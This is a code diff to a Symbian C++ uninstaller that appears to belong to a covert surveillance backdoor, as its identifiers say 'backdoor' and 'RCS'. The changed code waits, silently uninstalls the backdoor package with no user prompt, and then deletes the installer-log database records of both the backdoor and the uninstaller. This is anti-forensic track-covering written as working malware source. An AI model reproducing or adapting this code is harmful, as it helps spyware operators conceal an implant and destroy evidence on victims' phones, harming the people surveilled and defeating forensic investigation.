@@ -17,11 +17,22 @@
 #include <swinstdefs.h>
 #include <d32dbms.h>
 
+#include "Keys.h"	//into Core\inc
+
 
 //  Local Functions
 
 LOCAL_C void DeleteInstallerLog(TUid aUid)
 	{
+	// install log table has been defined into Symbian source code as:
+	/*
+	// SQL query to create the log table
+	_LIT( KLogCreateTableSQL, 
+	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
+	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
+	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
+	*/
+
 	_LIT( KLogSecureFormat, "SECURE%S" );   // found  in LogTask.cpp
 	#define KSWInstLogAccessPolicyUid 0x10207216  // found in SWInstUid.h
 	// UID of the SWInstLog db access policy, found in SWInstLogTaskParam.h
@@ -75,15 +86,8 @@ LOCAL_C void DeleteInstallerLog(TUid aUid)
 
 LOCAL_C void MainL()
 	{
-	// install log table has been defined into Symbian source code as:
-	/*
-	// SQL query to create the log table
-	_LIT( KLogCreateTableSQL, 
-	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
-	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
-	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
-	*/
-
+	
+	//Let's give the Swi time for exiting and being recalled
 	User::After(10*1000000);
 	
 	// Prepare for bd uninstall	
@@ -91,24 +95,35 @@ LOCAL_C void MainL()
 	SwiUI::TUninstallOptions iOptions;
 	SwiUI::TUninstallOptionsPckg iOptionsPckg; 
 	iOptions.iKillApp=SwiUI::EPolicyAllowed;
-	iOptionsPckg = iOptions; 
-	TUid kUid = {0x200305D7};   //  Note! UID of your SIS file NOT of your app
+	iOptionsPckg = iOptions;
+	
+	// retrieve UID of sis file to uninstall
+	// Note! UID of your SIS file, NOT of your app
+	TBuf8<12> hexBuf(KUidBackdoor);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	TUint32 bdUid;
+	lex.Val(bdUid,EHex);
+	TUid kUid = TUid::Uid(bdUid);
 	
 	TInt err = iLauncher.Connect();
 	if(err == KErrNone)
 		{
-		// Uninstall Without Call back request
-		TInt a;
-		// Silent uninstall
-		a=iLauncher.SilentUninstall(kUid, iOptionsPckg,SwiUI::KSisxMimeType) ;
+		// Synchronous silent uninstall
+		TInt a=iLauncher.SilentUninstall(kUid, iOptionsPckg,SwiUI::KSisxMimeType) ;
 		}
 	iLauncher.Close();
 	
-	// Delete install log for Uninstaller install
-	TUid uninstallerUid = {0x200305DB};
+	// Delete install log of Uninstaller install
+	hexBuf.Copy(KUidUninstaller);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	lex.Assign(hexBuf);
+	TUint32 uninstUid;
+	lex.Val(uninstUid,EHex);
+	TUid uninstallerUid = TUid::Uid(uninstUid);
 	DeleteInstallerLog(uninstallerUid);
 		
-	// delete uninstall log for bd uninstall
+	// Delete install log of RCS uninstall
 	DeleteInstallerLog(kUid);
 		
 	}
